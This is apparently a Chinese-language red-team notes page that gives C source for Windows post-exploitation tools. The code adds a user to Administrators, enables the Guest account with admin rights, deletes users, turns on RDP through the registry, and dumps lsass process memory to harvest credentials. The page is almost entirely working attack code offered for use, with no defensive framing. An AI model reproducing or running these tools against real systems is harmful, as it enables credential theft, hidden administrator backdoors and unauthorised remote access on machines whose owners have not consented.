---
title: Windows API tools
tags: tools
---

# Windows API tools

（编译后的地址：https://github.com/Ryze-T/Windows_API_Tools）

## 增加用户

```c
#include <stdio.h>
#include <windows.h> 
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

int wmain(int argc, wchar_t* argv[])
{
    USER_INFO_1 ui;
    DWORD dwLevel = 1;
    DWORD dwError = 0;
    NET_API_STATUS nStatus;

    if (argc != 3)
    {

        fwprintf(stderr, L"Usage:AddUser.exe [username] [password]\n", argv[0]);
        exit(1);
    }

    ui.usri1_name = argv[1];
    ui.usri1_password = argv[2];
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;

    nStatus = NetUserAdd(NULL,dwLevel,(LPBYTE)&ui,&dwError);

    if (nStatus == NERR_Success)
    {
        LOCALGROUP_MEMBERS_INFO_3 account;
        account.lgrmi3_domainandname = argv[1];
        NET_API_STATUS Status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
        if (Status == NERR_Success || Status == ERROR_MEMBER_IN_ALIAS) {
            printf("Successfully!");
        }
        else {
            printf("Failed!");
        }
    }
    else
    {
        printf("Add User failed");
    }
    return 0;
}
```

## 激活 Guest

```c
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <windows.h> 
#include <lm.h>

int main(int argc, wchar_t* argv[])
{
	DWORD dwError = 0;
	DWORD dwLevel = 1008;
	DWORD dwLevel2 = 1003;
	USER_INFO_1008 ui;
	USER_INFO_1003 ui1; 
	NET_API_STATUS ntStatus, ntStatus2, ntStatus3;

	
	ui.usri1008_flags = UF_SCRIPT;

	ui1.usri1003_password = argv[1];

	ntStatus = NetUserSetInfo(NULL,
		L"guest",
		dwLevel,
		(LPBYTE)&ui,
		NULL);
	
	if (ntStatus == NERR_Success)
	{
		ntStatus2 = NetUserSetInfo(NULL,L"guest",dwLevel2,(LPBYTE)&ui1,NULL);
		if (ntStatus2 == NERR_Success)
		{
			LOCALGROUP_MEMBERS_INFO_3 account;
			account.lgrmi3_domainandname = L"guest";
			ntStatus3 = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1); 
			if (ntStatus3 == NERR_Success)
			{
				fwprintf(stderr, L"Guest has been enabled\n");
			}
			else
			{
				fwprintf(stderr, L"Failed to add group\n: %d",ntStatus3);
			}
		}
		else {
			fprintf(stderr, "Failed to change password : %d\n", ntStatus2);
		}
	}
	else
		fprintf(stderr, "Failed to activate guest: %d\n", ntStatus);
	return 0;
}
```

## 删除用户

```c
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "netapi32.lib")

#include <stdio.h>
#include <windows.h> 
#include <lm.h>

int wmain(int argc, wchar_t* argv[])
{
    DWORD dwError = 0;
    NET_API_STATUS nStatus;
    //
    // All parameters are required.
    //
    if (argc != 2)
    {
        fwprintf(stderr, L"Usage: %s  username\n", argv[0]);
        exit(1);
    }
    //
    // Call the NetUserDel function to delete the share.
    //
    nStatus = NetUserDel(NULL, argv[1]);
    //
    // Display the result of the call.
    //
    if (nStatus == NERR_Success)
        fwprintf(stderr, L"success");
    else
        fprintf(stderr, "%d", nStatus);

    return 0;
}
```

## 开启 RDP

```c
#include <Windows.h>
#include <stdio.h>


int wmain(int argc, wchar_t* argv[])
{
	HKEY hKey;
	long lResult;
	DWORD dwType = REG_DWORD;
	DWORD value = 0;

	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server", 0, KEY_WRITE, &hKey);

    if (lResult == ERROR_SUCCESS)
    {
		lResult = RegSetValueEx(hKey, L"fDenyTSConnections",0,dwType, (LPBYTE)&value,sizeof(DWORD));
		if (lResult == ERROR_SUCCESS)
		{
			printf("success");
		}
		else
		{
			printf("failed");
		}
    }
	else
	{
		printf("Unable to open registry");
	}
}
```

## 转储 lsass内存

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <dbghelp.h>

#pragma comment(lib, "Dbghelp.lib")

// 提升权限为 debug
BOOL EnablePriv()
{
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tkp;

		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);//修改进程权限
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL);//通知系统修改进程权限

		return((GetLastError() == ERROR_SUCCESS));
	}
	return TRUE;
}

int main()
{

	// 获取 lsass.exe 进程ID
	PROCESSENTRY32 processInfo;	// 拍摄快照时驻留在系统地址空间里的进程列表结构体
	processInfo.dwSize = sizeof(processInfo);	//结构大小
	LPCWSTR processName = L""; //进程名
	DWORD lsassPid = 0;
	HANDLE lsassHandle = NULL;

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);	//拍摄所有进程以及这些进程相关堆、模块、线程的快照
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("Failed to take snapshot");
		return 0;
	}

	Process32First(processesSnapshot, &processInfo);	//检索快照中第一个进程的信息

	while (Process32Next(processesSnapshot, &processInfo))	//循环检索快照中的进程
	{
		processName = processInfo.szExeFile;	// 获取当前进程的进程名
		if (!strcmp(processName, L"lsass.exe"))
		{
			lsassPid = processInfo.th32ProcessID;
			CloseHandle(processesSnapshot);
		}
	}

	HANDLE outFile = CreateFile(L"1.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);	//	创建文件存储 lsass dump

	printf("Lsass Pid: %d\n", lsassPid);

	EnablePriv();

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPid);	// 根据 Pid 打开 lsass.exe 进程
	

	BOOL dumpResult = MiniDumpWriteDump(lsassHandle, lsassPid, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	if (dumpResult)
	{
		printf("dump success");
	}
	else
	{
		HRESULT  errorCode = GetLastError();

		printf("error: %lu", (DWORD)errorCode);
	}

}
```



